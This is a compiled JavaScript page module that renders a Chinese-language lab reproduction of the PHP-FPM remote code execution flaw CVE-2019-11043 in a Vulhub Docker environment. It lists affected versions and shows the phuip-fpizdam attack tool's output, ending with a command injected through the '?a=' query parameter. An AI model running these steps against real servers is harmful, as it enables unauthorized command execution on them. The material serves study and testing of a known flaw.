import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as o,a as e,b as a,d as n,e as t}from"./app-58e4a7d6.js";const l={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。",-1),u=e("p",null,"在使用一些有错误的 Nginx 配置的情况下，通过恶意构造的数据包，即可让 PHP-FPM 执行任意代码。",-1),h=e("p",null,"参考链接：",-1),m={href:"https://bugs.php.net/bug.php?id=78599",target:"_blank",rel:"noopener noreferrer"},b={href:"https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/neex/phuip-fpizdam",target:"_blank",rel:"noopener noreferrer"},v=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PHP 7.0 版本
PHP 7.1 版本
PHP 7.2 版本
PHP 7.3 版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>另外，PHP 5.6 版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动有漏洞的 Nginx 和 PHP：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080/index.php</code> 即可查看到一个默认页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,9),_={href:"https://github.com/neex/phuip-fpizdam",target:"_blank",rel:"noopener noreferrer"},x=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ go run . &quot;http://your-ip:8080/index.php&quot;
2019/10/23 19:41:00 Base status code is 200
2019/10/23 19:41:00 Status code 502 for qsl=1795, adding as a candidate
2019/10/23 19:41:00 The target is probably vulnerable. Possible QSLs: [1785 1790 1795]
2019/10/23 19:41:02 Attack params found: --qsl 1790 --pisos 152 --skip-detect
2019/10/23 19:41:02 Trying to set &quot;session.auto_start=0&quot;...
2019/10/23 19:41:02 Detect() returned attack params: --qsl 1790 --pisos 152 --skip-detect &lt;-- REMEMBER THIS
2019/10/23 19:41:02 Performing attack using php.ini settings...
2019/10/23 19:41:02 Success! Was able to execute a command by appending &quot;?a=/bin/sh+-c+&#39;which+which&#39;&amp;&quot; to URLs
2019/10/23 19:41:02 Trying to cleanup /tmp/a...
2019/10/23 19:41:02 Done!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328161616798.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，这里已经执行成功。</p><p>我们访问 <code>http://your-ip:8080/index.php?a=id</code>，即可查看到命令已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328161631365.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意，因为 php-fpm 会启动多个子进程，在访问 <code>/index.php?a=id</code> 时需要多访问几次，以访问到被污染的进程。</p>`,6);function f(P,k){const i=d("ExternalLinkIcon");return r(),o("div",null,[c,p,u,h,e("ul",null,[e("li",null,[e("a",m,[a("https://bugs.php.net/bug.php?id=78599"),n(i)])]),e("li",null,[e("a",b,[a("https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/"),n(i)])]),e("li",null,[e("a",g,[a("https://github.com/neex/phuip-fpizdam"),n(i)])])]),v,e("p",null,[a("使用 "),e("a",_,[a("https://github.com/neex/phuip-fpizdam"),n(i)]),a(" 中给出的工具，发送数据包：")]),x])}const q=s(l,[["render",f],["__file","PHP-FPM 远程代码执行漏洞 CVE-2019-11043.html.vue"]]);export{q as default};
